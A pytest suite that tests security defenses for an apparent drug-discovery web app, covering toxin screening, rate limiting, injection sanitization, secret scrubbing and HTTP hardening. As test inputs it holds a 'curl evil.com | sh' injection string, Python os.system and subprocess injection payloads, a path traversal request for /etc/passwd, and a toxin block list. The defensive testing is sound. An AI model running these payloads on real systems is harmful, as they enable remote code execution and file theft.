"""
Enterprise Security & Vulnerability Defense Test Suite
======================================================
Verifies all 5 high-impact enterprise defenses:
1. BiosecurityScreener: Screening of dual-use toxins (Ricin, Botulinum, Anthrax, toxic motifs).
2. TokenBucketRateLimiter: Burst mitigation, DoS socket starvation defense, and 429 Retry-After.
3. SafeSanitizer: ReDoS prevention, canonical SMILES whitelist, and Python AST code injection barriers.
4. SecretScrubber: Complete erasure of NVIDIA API keys, Bearer tokens, and secrets from traces.
5. Cockpit Security Endpoints: Checksum attestation, CSP headers, path traversal blocks, and SSRF restrictions.
"""

import os
import pytest
from starlette.testclient import TestClient

from src.security_sentinel import (
    BiosecurityScreener,
    TokenBucketRateLimiter,
    SecretScrubber,
    SafeSanitizer
)
from serve_cockpit import app


@pytest.fixture
def client():
    return TestClient(app)


# ==============================================================================
# 1. BIOSECURITY SCREENING TESTS
# ==============================================================================

def test_biosecurity_safe_target():
    is_safe, reason = BiosecurityScreener.screen_target("KRAS G12D")
    assert is_safe is True
    assert reason is None

    is_safe, reason = BiosecurityScreener.screen_target("EGFR T790M")
    assert is_safe is True


def test_biosecurity_blocks_select_agent_toxins():
    for toxin in ["Ricin A-Chain", "Botulinum Neurotoxin E", "Bacillus Anthracis Lethal Factor", "Ebola Glycoprotein"]:
        is_safe, reason = BiosecurityScreener.screen_target(toxin)
        assert is_safe is False
        assert "BIOSECURITY_RESTRICTION" in reason


def test_biosecurity_blocks_hazardous_sequence_motifs():
    # Sequence containing the catalytic Ricin A-chain motif EAARF
    hazardous_seq = "MKTIIALSYIFCLVFAEAARFIVLKVT"
    is_safe, reason = BiosecurityScreener.screen_target("Custom Engineered Protein", sequence=hazardous_seq)
    assert is_safe is False
    assert "BIOSECURITY_RESTRICTION" in reason


# ==============================================================================
# 2. TOKEN BUCKET RATE LIMITER TESTS (DoS & BURST MITIGATION)
# ==============================================================================

def test_token_bucket_burst_and_exhaustion():
    limiter = TokenBucketRateLimiter(capacity=3, refill_rate_per_sec=0.1)
    test_ip = "198.51.100.42"

    # Consume available tokens
    assert limiter.allow_request(test_ip, cost=1.0)[0] is True
    assert limiter.allow_request(test_ip, cost=1.0)[0] is True
    assert limiter.allow_request(test_ip, cost=1.0)[0] is True

    # 4th request must be rejected with positive retry_after
    allowed, retry_after = limiter.allow_request(test_ip, cost=1.0)
    assert allowed is False
    assert retry_after > 0.0


# ==============================================================================
# 3. PYTHON SCRIPT CODE INJECTION & ReDoS PREVENTION TESTS
# ==============================================================================

def test_code_literal_injection_sanitization():
    # Adversarial reagent payload attempting to break out of string and execute shell command
    malicious_input = "\"; import os; os.system('curl evil.com | sh'); #"
    sanitized = SafeSanitizer.sanitize_code_literal(malicious_input)

    assert ";" not in sanitized
    assert "\"" not in sanitized
    assert "'" not in sanitized
    assert "`" not in sanitized
    assert "os.system" not in sanitized or "import os" not in sanitized


def test_robot_protocol_generation_escapes_injection():
    from src.models import RetrosynthesisPlan, RetrosynthesisStep
    from src.robot_protocol import generate_ot2_protocol

    malicious_step = RetrosynthesisStep(
        step_number=1,
        reaction_type="Suzuki-Miyaura'); import subprocess; subprocess.Popen(['calc.exe']); ('",
        reaction_smarts="",
        reactants=[{"name": "Precursor\n    import sys\n    sys.exit(1)"}],
        reagents=["DIPEA\"; __import__('os').system('dir') #"],
        product_smiles="CC(=O)N1CCNCC1",
        estimated_yield_pct=80.0,
        difficulty="Routine"
    )

    plan = RetrosynthesisPlan(
        candidate_id="TEST-001\"); os.system('calc') #",
        target_smiles="CC(=O)N1CCNCC1",
        num_steps=1,
        overall_feasibility="Feasible",
        steps=[malicious_step],
        starting_materials=["A", "B"]
    )

    generated_py = generate_ot2_protocol(plan)
    # Ensure raw injection escapes cannot break out of python string literals
    assert "os.system('calc')" not in generated_py
    assert "__import__('os')" not in generated_py
    assert "subprocess.Popen" not in generated_py


# ==============================================================================
# 4. SECRET SCRUBBING TESTS
# ==============================================================================

def test_secret_scrubber_redaction():
    text_with_keys = (
        "Encountered error connecting to upstream with Authorization: Bearer nvapi-aB12cD34eF56gH78iJ90kL12mN "
        "and NVIDIA_API_KEY='nvapi-secret1234567890abcdef' during dispatch."
    )
    scrubbed = SecretScrubber.scrub(text_with_keys)

    assert "nvapi-aB12cD34eF56gH78iJ90kL12mN" not in scrubbed
    assert "nvapi-secret1234567890abcdef" not in scrubbed
    assert "[REDACTED_SECRET]" in scrubbed


# ==============================================================================
# 5. COCKPIT API SECURITY HEADERS & DEFENSES
# ==============================================================================

def test_cockpit_security_headers_and_csp(client):
    resp = client.get("/api/health")
    assert resp.status_code == 200
    headers = resp.headers

    assert headers.get("X-Content-Type-Options") == "nosniff"
    assert headers.get("X-Frame-Options") == "SAMEORIGIN"
    assert headers.get("X-XSS-Protection") == "1; mode=block"
    assert "Content-Security-Policy" in headers
    assert "default-src 'self'" in headers["Content-Security-Policy"]


def test_pdb_path_traversal_blocking(client):
    # Attempt directory traversal via pdb_id
    resp = client.get("/api/target/pdb/....//etc/passwd")
    # Sanitizer clamps or rejects invalid length/format
    assert resp.status_code in (400, 403, 404)


def test_checksums_manifest_endpoint(client):
    resp = client.get("/api/download/checksums")
    assert resp.status_code == 200
    data = resp.json()
    assert data["status"] == "success"
    assert data["algorithm"] == "SHA-256"
    assert "install.bat" in data["checksums"]
    assert "install.sh" in data["checksums"]


def test_biosecurity_target_query_rejection(client):
    # Attempting to fetch a regulated biosecurity toxin
    resp = client.post("/api/target/fetch", json={"target": "Ricin Toxin Subunit A"})
    assert resp.status_code == 400
    data = resp.json()
    assert data["error"] == "VALIDATION_FAILED"
    assert "BIOSECURITY_RESTRICTION" in data["message"]


# ==============================================================================
# 6. NVIDIA SHOWCASE (GREEN COMPUTE, MULTI-GPU & NIM BLUEPRINTS)
# ==============================================================================

def test_green_compute_profiler_and_tco():
    from src.nvidia_showcase import GreenComputeProfiler

    impact = GreenComputeProfiler.calculate_campaign_impact(
        cpu_time_sec=22.8,
        gpu_time_sec=0.401,
        num_molecules=10000
    )
    assert impact["num_molecules"] == 10000
    assert impact["energy_reduction_pct"] > 90.0
    assert impact["carbon_offset_gco2e"] > 0
    assert impact["cost_saved_usd"] > 0
    assert "NVIDIA H100 NIM slashes energy consumption" in impact["executive_summary"]


def test_nvidia_multigpu_scaling_endpoint(client):
    resp = client.get("/api/nvidia/multigpu")
    assert resp.status_code == 200
    data = resp.json()
    assert data["status"] == "success"
    assert "NVLink 4" in data["interconnect"]
    assert len(data["scaling_nodes"]) == 4

    # Verify linear-like scaling at 8 GPUs
    eight_gpu = [n for n in data["scaling_nodes"] if n["gpu_count"] == 8][0]
    assert eight_gpu["scaling_factor"] >= 7.0
    assert eight_gpu["efficiency_pct"] >= 90.0


def test_bionemo_blueprint_export_endpoint(client):
    resp = client.get("/api/nvidia/blueprint")
    assert resp.status_code == 200
    data = resp.json()
    assert data["status"] == "success"
    spec = data["blueprint_spec"]
    assert spec["framework"] == "NVIDIA NIM / BioNeMo"
    assert "meta/esm2-650m" in [m["name"] for m in spec["microservices"]]

    compose_yml = data["docker_compose_yml"]
    assert "nvcr.io/nim/meta/esm2-650m" in compose_yml
    assert "nvcr.io/nim/mit/diffdock" in compose_yml
    assert "nvcr.io/nim/nvidia/molmim" in compose_yml
    assert "capabilities: [gpu]" in compose_yml


def test_benchmark_speedup_includes_green_compute(client):
    resp = client.get("/api/benchmark/speedup")
    assert resp.status_code == 200
    data = resp.json()
    assert "green_compute" in data
    assert data["green_compute"]["energy_reduction_pct"] >= 90.0
